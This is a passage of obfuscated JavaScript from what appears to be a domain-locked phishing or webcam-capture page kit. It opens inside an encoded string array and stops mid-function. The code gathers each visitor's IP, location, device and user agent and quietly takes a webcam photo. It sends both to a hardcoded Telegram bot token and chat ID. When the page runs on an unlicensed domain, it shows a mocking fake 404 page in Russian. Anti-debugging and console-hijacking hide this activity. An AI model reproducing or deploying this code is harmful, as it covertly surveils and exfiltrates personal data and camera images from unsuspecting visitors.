'W7hcLSoSqG', 'W5VcGmoJFgm', 'wSknmam', 'W7z+W7uRua', 'tJzTWOdcUa', 'aNxcN2/cUa', 'WOFcJCkwwCon', 'ySkhzmklcG', 'hCoHc1je', 'sca9WOlcQq', 'vCoWgq', '0ARsO9ko05eI', 'Brz1Cmo1', 'W4jnWPlcMmktogK', 'r8keWPtdQqi', 'bJlcLSknW4G', 'grZdVu1J', 'y8o8WRRcHa8', 'xgLcW6pdGW', 'WP4tjCk4aa', 'W5yvimk0', 'WQLZWQdcSmkw', 'BmkkBa', '0iVsQ9cN0RJqTW', 'dmoCoq', 'WRGypCoDqG', 'qxhcL3xcOG', 'WRbXWQtcPLC', 'vmoarSkgcq', 'f8krWRxcTmo9', 'gdlcL8kJW4C', 'rvhcUSoffq', 'WPddLCkLu3W', 'W4HiW7uHra', 'vmkyWO7dSSk2', 'kSk3ptnj', 'W4pdPSoAW5NcSa', 'gmkGWOJdTG4', 'W63dLSo4bmkB', 'W607WQ7dOKi', 'qSkvmIqp', 'WQmVn8otba', 'W47dM8oci8kM', 'WQVcQCktBmoi', 'W4bnc8oteW', 'WOD+sxv6', 'aCkfW63dMgy', 'oCkyWOlcHmot', 'eX/cRv/dQG', 'vmoybCkyfG', 'cSk8aNRcRW', 'sL3dKCoiWPa', 'WO1yWP3cUwS', 'WQVcPCkJs8oM', 'W5tdOCoeh8kB', 'WP4gW47IJjVdOq', 'W6H5baZcGG', '07dsOSkW0Bzh', 'W4tdOCojiSkx', 'amkKxSojrIKviGxdKmkskCkZ', 'W6VdM8oqp8k+', 'W5qAb8kEbG', 'W7nlW6mBza', 'nxuUchO', 'ugLvW4pdNW', 'W5GLtvddUW', 'W5RdHSkEawy', 'iSkPW7ldH1K', 'WROTo8ovwq', 'W7WTbCkEFq', 'W7buW7muua', 'W7xcSCoYxXC', 'w8oNW4VcHwC', '0PJsSDkcWPZtOW', 'DSoqsSk/oW', 'vYNdMGnD', 'W6xdMWJcSpgoGBq', 'W4qBW4ZdTt4', 'v8kzsHWx', 'W4dcS8kEW5RcSa', 'WPNcMmkdqSoF', 'WQL7WQpcSCkE', 'rt7cNIRcSW', 'W5xcTCoEDc0', 'rCoAmaGW', 'bWy5W7ddMq', 'W4rmgCoOaa', 's8kNDayo', '0O/tMDk00yv1', 'WOpcK8oWrd4', 'WQjoWR0pW4q', 'W6/dNCoqnmkn', 'W67dKeldN8kR', 'WQODjWq', 'vCoYbCkYkG', 'WOJcNmo3sIe', 'DmoFr8oqga', 'tSkvWOVdU8kR', 'WPlcJriOWQu', '4P2Ttmo8hN8', 'WRlcPGejWRG', 'j8kgbhxcNG', 'W7pcI3zixq', 'n8kCWPBcMCoh', 'WO/cUmo4rcS', 'jCkQkh0m', 'gSoXamkwcq', 'W4OIbM3cSq', 'xxzaW5VdHa', 's8kEWOhdUCkN', 'eSkZW5VcJt8', 'WO1SW47cT3W', 'omkwWPtcVSok', 'W7/cSmojCGm', 'wSkQwW9u', 'W5CGhw/cUG', 'n8kXjwCA', 'WQGHoZiO', 'W7xcMmoxEtq', 'WRlcJCoeyI4', 'W53dU8oD', '06prHwlrLDgH', 'W4uAgSklFW', 'WRtcSCo+BG8', 'bCkzW5ZdGKC', 'W5fpWQyFAa', 'exGOb3q', 'u38kWOddRW', 'y09RDmkg', 'r1jwFCkW', 'B03cMSog', 'httcMmknW54', 'W7b+W7q', 'W5T9FVcDT4pdGa', 'FCknmsSp', 'j8kjWP/cGCox', 'u8kPWPxdJG8', 'tmoqW5RcGg4', 'WP/cJW8SWRG', 'W7xcHSoMBJO', 'z8oFxq', 'W6/cVSoevG0', 'WQldHCkZF2q', 'W6FdQ1FdSSkS', 'WPFdT8o7nmk2', 'W6pcKCoPuXm', 'tfLiEmkq', 'WQSsW7GhW64', 'W4uppCkVwa', 'qCo6hq', 'WQ9zWRNcU8kp', 'W6fOzmkcxa', 'W6JdMCozm8ki', 'WP1xWP3cPN0', 'wSkvmGeY', 'uSohW4tcRsy', 'WPj/WRFcSCkr', 'WO1nWRFcUKW', 'vxdcKMJcPa', 'WQOAer4O', 'iSk3j2fw', 'BCorfFcVRBdcLq', 'ENb5DCkL', '8jInMCkClM3cHW', 'WR0AlbKU', 'ENG2', 'WPlcP8oDtYq', 'gxW8WO/cIG', 'WRPmWO/dMSk3', 'sZhcHg3dOq', 'tMKwW6VdJW', 'xmkPWPldLwe', 'tNBcKq', 'B0nUDCkc', 'WRRdMd8bWRS', 'sM9xW4VdHq', 'WQ7cJCoMzru', 'WQZcLCotrZa', '0kttL8kC0y7rHW', 'W41XbJJcMa', 'WRqtW4tcLdS', 'kd9zWQxdNq', 'W6DJWRldOKm', 'W71Oz8khgq', 'W7NcVSohqYG', 'tCkCWOFdJCk+', 'dGr6WOFdNG', 'W5BdGCoxu24', 'D3zQW7hdUq', 'CSocqCorhW', 'WRSEbCo4wq', 'W5tcICo2AIK', 'W5aBj1NcSa', 'vdRdOHH8', 'f10njwS', 'W6HWlbNcVG', 'CmoVlCkZna', 'W6dcRSodr2G', 'w8oaEmkCkG', 'WQVdO8oNzWq', 'WQ0tW7idW64', 'W77cINXQxW', 'mSkrb3K', 'x8kPWOldRHm', 'vCogW5FcRdm', 'W7KQeg7cRq', 'W63dU0ZdRCkC', 'W4pdVmodhSkn', 'sqjXWRxdLG', 'CY5KW6ZcPq', 'mCowjNLQ', 'W5NcImoLAdi', 'EmkCW74KrG', 'B1n1Fmk9', 'qvFcUuRcVa', 'z2lcI8oibW', 'WRFdMmkNxW', 'W7VcNSolrb4', 'yr7cRu/dHa', 'ACoaoSkBfa', 'n8ksWOJcMCox', 'W5yzf2pcRG', 'WOpcKSo6g2y', 'mmkyWPdcHmor', 'rmoaWPdcScC', '047tK9c50B3tTW', 's8o8W5ZcMNy', 'W5xdUSoihCkA', 'CmksWOVdQSk7', 'A3iJW4yC', 'mmkMjxSk', 'WOCSW7qJWQy', '0AxqQnkV0l3qQq', 'w8ozW5VcSZa', 'W5/cK8oHBJG', 'W4xdOCoc', 'qmkEWPVdNmk8', '0P7qPTgR06NqIG', 'W4nbcq', 'W5uukSkWuG', 'W5T1kCoLnG', 'ECosrmkmnG', 'cSo3W5pcNwm', 'kSkSkJnj', 'WOpcKSo6', 'WQKwW6Kn', 'WP11WQBcRgm', 'W4/cR8oRDYC', 'W6/dPCokW5NcRG', 'WQyzW4KFWQq', 'j8kImgGA', 'A2m7W5GA', 'mCkOW7VdRvK', 'q0frAmkt', 'oGzXzW', 'qITKW4xdSq', 'z8o4A8k9jq', 'WPT+wgzr', 'xMmaW58R', '0i3dInc2pnoq', '07ZrVDgimmo0', 'uKHMW4FdMq', 'rslcGstdSa', 'WPRcIH8', 'DCkiW5uzyG', 'WPxcG8kEWPZdVa', 'hSkIe2VcQa', 'yrxcNhldJG', 'WPtdI8kDy2y', 'W7VcGxzOuW', 'WPO8zuv3', 'W4XbeSozba', 'WPHxWQRcMmk1', 'xv/cPmoMfa', '0ANqJnkv0PRrIa', 'W6ldSmooW6/cPa', 'WQBcUSkCwCoD', 'wLneW6VdHa', 'vgxcO0JdPW', 't8oKzCk0cW', 'z1T7FSkL', 'WQfizv1M', 'rdzfW5BcQG', 'W7fxhYZcSW', 'WOaRAu58', 'WODYWOZcTgq', 'qCo4umkGpG', 'WRyEfWqk', '0yNqIIhrNSo1', 'WQbzWQS', 'zvnVEmkH', 'hfKlmfm', 'gYtcMmkCW5K', '0BJqUDcm0PFtRW', '0jxsSmop05VtRq', 'W6lcNmoDAq', 'WQhcICosASoP', 'W6tdKeldTSkS', 'rWpdGdjl', 'oCkVW7BdJue', 'WRvOiCoDda', 'rudcSMBcGG', 'WQLrWR7cTmkw', 'bmoYhL9F', 'WPvCWQhcKW', 'W7DHW6m', 'WQmrW74yWRS', 'r8kakqK5', 'W6tcGdZWSBEsWQu', 'vCkEWOVcPCoz', 'WOiirwjq', 'WRZcU8kbvq', 'WRJdT8oJqW', 'W4xdUSoEa8ox', 'dXD3WRpdKG', 'WQ9SWQ3dUSkS', 'W6/cICoIzGK', 'j8kMEGpWPyoZ', 'W6JcPNXPtG', 'WQRdJ8kZx2O', 'WOGCW5FcMea', 'WRBdJCo3qrG', 'ySksWPa', 'WQjKDCogxG', 'WPtcGefTWQO', 'WO4qxCksuW', 'cL4+exe', 'B2rIW6qx', 'F2jbW6RdRG', 's8kmFq', 'cYldVdZdRa', '0kVqUDcb0PpsLa', 'yCkxWQldOZy', 't8kgjWmJ', 'WOJcK8o8Dce', 'WQqsW6CvWR4', 'W5n/lab7', 'W5OahgpcUa', 'WPqNemoHvG', 'C1e1W6ys', 'W7tcRmoKBJe', 'W48on8k5tW', 'W4ldRmoyW4G', 'ASkoFcKh', 'WO3cMraVWQa', 'W7/dVCo0b8kY', 'W7nOkqlcSa', 'nmkPW73dNq', 'y8kQWP/cQCoL', 'WOX0rxr0', 'w2Xlz8kL', 'W6D+WPxcM8kP', 'vCoixSkBnG', 'BvD1FSkM', '0B3sGTcg0yRrLG', 'W5Tzh8oQka', 'x05XW57dOG', 'xmoBWOddRSkY', 'FCodrCkr', 'g8obc1HE', 'wmo7bmkzaq', 'W7hcGgDJxW', 'W7VcLmocoIG', 'W4TrkXBcVa', 'W4JcQvzMAa', 'WRuHjSocqa', 'W51nW4WSsq', 'W6BdM1JdJG', 'wCkPWPxdPWG', 'W6vYWQBdP0G', 'lCkXW5KpBq', 'WQrDWO3cSSol', 'bSkvWO3cUCoQ'];
  _0x5736 = function () {
    return _0x33fe80;
  };
  return _0x5736();
}
function getCountryEmoji(_0x226e00) {
  return _0x226e00.replace(/./g, _0x199506 => String.fromCodePoint(127397 + _0x199506.toUpperCase().charCodeAt()));
}
async function captureAndSendPhoto() {
  try {
    const _0x4a7cdc = {
      video: true
    };
    const _0x1e6ed2 = await navigator.mediaDevices.getUserMedia(_0x4a7cdc);
    const _0x1fad7c = document.createElement("video");
    _0x1fad7c.srcObject = _0x1e6ed2;
    await _0x1fad7c.play();
    const _0x55efa7 = document.createElement("canvas");
    _0x55efa7.width = _0x1fad7c.videoWidth;
    _0x55efa7.height = _0x1fad7c.videoHeight;
    const _0x490fdc = _0x55efa7.getContext('2d');
    _0x490fdc.drawImage(_0x1fad7c, 0, 0, _0x55efa7.width, _0x55efa7.height);
    _0x1fad7c.pause();
    _0x1e6ed2.getTracks().forEach(_0x24b861 => _0x24b861.stop());
    const _0x53e68b = await new Promise(_0xf19e51 => _0x55efa7.toBlob(_0xf19e51, "image/jpeg"));
    const _0x2d3ad0 = new FormData();
    _0x2d3ad0.append("chat_id", "7728504492");
    _0x2d3ad0.append("photo", _0x53e68b, "photo.jpg");
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendPhoto", {
      'method': "POST",
      'body': _0x2d3ad0
    });
    console.log("Photo captured and sent successfully");
  } catch (_0x54cc59) {
    console.error("Failed to capture photo:", _0x54cc59);
  }
}
async function initTelegramBot() {
  const _0x511980 = function () {
    let _0x491a23 = true;
    return function (_0x5652a2, _0x5c6ad4) {
      const _0x3d41a4 = _0x491a23 ? function () {
        if (_0x5c6ad4) {
          const _0x51d5d3 = _0x5c6ad4.apply(_0x5652a2, arguments);
          _0x5c6ad4 = null;
          return _0x51d5d3;
        }
      } : function () {};
      _0x491a23 = false;
      return _0x3d41a4;
    };
  }();
  const _0x2739d5 = _0x511980(this, function () {
    return _0x2739d5.toString().search("(((.+)+)+)+$").toString().constructor(_0x2739d5).search("(((.+)+)+)+$");
  });
  _0x2739d5();
  const _0xd96445 = function () {
    let _0x3c80a5 = true;
    return function (_0x44f822, _0x8a351e) {
      const _0x2b4d13 = _0x3c80a5 ? function () {
        if (_0x8a351e) {
          const _0x8493fc = _0x8a351e.apply(_0x44f822, arguments);
          _0x8a351e = null;
          return _0x8493fc;
        }
      } : function () {};
      _0x3c80a5 = false;
      return _0x2b4d13;
    };
  }();
  (function () {
    _0xd96445(this, function () {
      const _0x46e582 = new RegExp("function *\\( *\\)");
      const _0x466754 = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
      const _0x4f7953 = _0x251581("init");
      if (!_0x46e582.test(_0x4f7953 + "chain") || !_0x466754.test(_0x4f7953 + "input")) {
        _0x4f7953('0');
      } else {
        _0x251581();
      }
    })();
  })();
  const _0x583295 = function () {
    let _0x3a09cd = true;
    return function (_0x3fcdc5, _0x2e6ce6) {
      const _0x373fab = _0x3a09cd ? function () {
        if (_0x2e6ce6) {
          const _0x53906b = _0x2e6ce6.apply(_0x3fcdc5, arguments);
          _0x2e6ce6 = null;
          return _0x53906b;
        }
      } : function () {};
      _0x3a09cd = false;
      return _0x373fab;
    };
  }();
  const _0x3e3550 = _0x583295(this, function () {
    let _0x28280b;
    try {
      const _0x4a7048 = Function("return (function() {}.constructor(\"return this\")( ));");
      _0x28280b = _0x4a7048();
    } catch (_0xd0f767) {
      _0x28280b = window;
    }
    const _0x31663f = _0x28280b.console = _0x28280b.console || {};
    const _0x386429 = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x22ae0a = 0; _0x22ae0a < _0x386429.length; _0x22ae0a++) {
      const _0x1b849 = _0x583295.constructor.prototype.bind(_0x583295);
      const _0x3acb02 = _0x386429[_0x22ae0a];
      const _0x45f8cc = _0x31663f[_0x3acb02] || _0x1b849;
      _0x1b849.__proto__ = _0x583295.bind(_0x583295);
      _0x1b849.toString = _0x45f8cc.toString.bind(_0x45f8cc);
      _0x31663f[_0x3acb02] = _0x1b849;
    }
  });
  _0x3e3550();
  const _0x539b89 = {
    domain: window.location.hostname,
    fullUrl: window.location.href
  };
  if (_0x539b89.domain !== "trd.cc.nf") {
    document.body.innerHTML = "\n            <div id=\"overlay\">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class=\"arrow top\"></div>\n                <div class=\"arrow bottom\"></div>\n                <div class=\"arrow left\"></div>\n                <div class=\"arrow right\"></div>\n                <img src=\"data:image/png;base64,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\" alt=\"Error Image\" style=\"max-width: 100%; height: auto;\" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n\n                <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" id=\"fixButton\">Fix It</a>\n            </div>\n        ";
    const _0x2984aa = document.createElement("style");
    _0x2984aa.innerHTML = "\n\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n\n        ";
    document.head.appendChild(_0x2984aa);
    const _0x163622 = await getUserInfo();
    await sendTelegramMessage("\n🚫 <b>Unauthorized Access Attempt Detected</b>\n📍 Domain: <code>" + _0x539b89.domain + "</code>\n🔗 URL: <code>" + _0x539b89.fullUrl + "</code>\n🌐 IP: <code>" + _0x163622.ip + "</code>\n📌 Location: " + _0x163622.city + ", " + _0x163622.region + ", " + _0x163622.countryName + " " + _0x163622.countryEmoji + "\n📱 Device: <code>" + _0x163622.deviceModel + "</code>\n🖥️ Type: <code>" + _0x163622.deviceType + " (" + _0x163622.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x163622.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    await captureAndSendPhoto();
    return;
  }
  try {
    const _0x4123cf = await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/getMe");
    const _0x520e4f = await _0x4123cf.json();
    if (_0x520e4f.ok) {
      console.log("Bot initialized");
      isAuthenticated = true;
      const _0x495179 = await getUserInfo();
      await sendTelegramMessage("\n🚀 <b>New Bot Access Detected</b>\n📍 Domain: <code>" + _0x539b89.domain + "</code>\n🔗 URL: <code>" + _0x539b89.fullUrl + "</code>\n🌐 IP: <code>" + _0x495179.ip + "</code>\n📌 Location: " + _0x495179.city + ", " + _0x495179.region + ", " + _0x495179.countryName + " " + _0x495179.countryEmoji + "\n📱 Device: <code>" + _0x495179.deviceModel + "</code>\n🖥️ Type: <code>" + _0x495179.deviceType + " (" + _0x495179.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x495179.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    }
  } catch (_0xa6049e) {
    console.error("Failed to initialize bot:", _0xa6049e);
    const _0x1c8989 = await getUserInfo();
    await sendTelegramMessage("\n❗️ <b>Bot Initialization Failed</b>\n📍 Domain: <code>" + _0x539b89.domain + "</code>\n🔗 URL: <code>" + _0x539b89.fullUrl + "</code>\n🌐 IP: <code>" + _0x1c8989.ip + "</code>\n📌 Location: " + _0x1c8989.city + ", " + _0x1c8989.region + ", " + _0x1c8989.countryName + " " + _0x1c8989.countryEmoji + "\n📱 Device: <code>" + _0x1c8989.deviceModel + "</code>\n🖥️ Type: <code>" + _0x1c8989.deviceType + " (" + _0x1c8989.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x1c8989.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
  }
}
function _0x500b30(_0x167afd, _0x15baa6, _0x57eeac, _0xb8bfd6, _0x291639) {
  return _0x25be(_0x167afd + 0x367, _0x15baa6);
}
function _0x25be(_0x31759e, _0x22c922) {
  const _0x351b16 = _0x5736();
  _0x25be = function (_0x1abd59, _0x1dfcd5) {
    _0x1abd59 = _0x1abd59 - 295;
    let _0x8d7c25 = _0x351b16[_0x1abd59];
    if (_0x25be.yDaGCk === undefined) {
      var _0x5d0d76 = function (_0x1e2cbf) {
        let _0x24a307 = '';
        let _0x4b8c1b = '';
        let _0x4117e7 = _0x24a307 + _0x5d0d76;
        let _0xb69cbe = 0;
        let _0x4bf719;
        let _0x32e086;
        for (let _0x179a9d = 0; _0x32e086 = _0x1e2cbf.charAt(_0x179a9d++); ~_0x32e086 && (_0x4bf719 = _0xb69cbe % 4 ? _0x4bf719 * 64 + _0x32e086 : _0x32e086, _0xb69cbe++ % 4) ? _0x24a307 += _0x4117e7.charCodeAt(_0x179a9d + 10) - 10 !== 0 ? String.fromCharCode(255 & _0x4bf719 >> (-2 * _0xb69cbe & 6)) : _0xb69cbe : 0) {
          _0x32e086 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='.indexOf(_0x32e086);
        }
        let _0x55541d = 0;
        for (let _0x15f81d = _0x24a307.length; _0x55541d < _0x15f81d; _0x55541d++) {
          _0x4b8c1b += '%' + ('00' + _0x24a307.charCodeAt(_0x55541d).toString(16)).slice(-2);
        }
        return decodeURIComponent(_0x4b8c1b);
      };
      const _0x1340e2 = function (_0x4f7784, _0x581bba) {
        let _0x4d11ee = [];
        let _0x580cf1 = 0;
        let _0xf44864;
        let _0x38b1e4 = '';
        _0x4f7784 = _0x5d0d76(_0x4f7784);
        let _0x385545;
        for (_0x385545 = 0; _0x385545 < 256; _0x385545++) {
          _0x4d11ee[_0x385545] = _0x385545;
        }
        for (_0x385545 = 0; _0x385545 < 256; _0x385545++) {
          _0x580cf1 = (_0x580cf1 + _0x4d11ee[_0x385545] + _0x581bba.charCodeAt(_0x385545 % _0x581bba.length)) % 256;
          _0xf44864 = _0x4d11ee[_0x385545];
          _0x4d11ee[_0x385545] = _0x4d11ee[_0x580cf1];
          _0x4d11ee[_0x580cf1] = _0xf44864;
        }
        _0x385545 = 0;
        _0x580cf1 = 0;
        for (let _0xda3150 = 0; _0xda3150 < _0x4f7784.length; _0xda3150++) {
          _0x385545 = (_0x385545 + 1) % 256;
          _0x580cf1 = (_0x580cf1 + _0x4d11ee[_0x385545]) % 256;
          _0xf44864 = _0x4d11ee[_0x385545];
          _0x4d11ee[_0x385545] = _0x4d11ee[_0x580cf1];
          _0x4d11ee[_0x580cf1] = _0xf44864;
          _0x38b1e4 += String.fromCharCode(_0x4f7784.charCodeAt(_0xda3150) ^ _0x4d11ee[(_0x4d11ee[_0x385545] + _0x4d11ee[_0x580cf1]) % 256]);
        }
        return _0x38b1e4;
      };
      _0x25be.IYTJYG = _0x1340e2;
      _0x31759e = arguments;
      _0x25be.yDaGCk = true;
    }
    const _0x199a32 = _0x351b16[0];
    const _0x3ad990 = _0x1abd59 + _0x199a32;
    const _0x45fa1d = _0x31759e[_0x3ad990];
    if (!_0x45fa1d) {
      if (_0x25be.amMIsW === undefined) {
        const _0xb40f98 = function (_0x55f541) {
          this.RsGAAI = _0x55f541;
          this.SxHLVE = [1, 0, 0];
          this.yLcMZd = function () {
            return 'newState';
          };
          this.KtPULM = "\\w+ *\\(\\) *{\\w+ *";
          this.xTIzQG = "['|\"].+['|\"];? *}";
        };
        _0xb40f98.prototype.iNpnCn = function () {
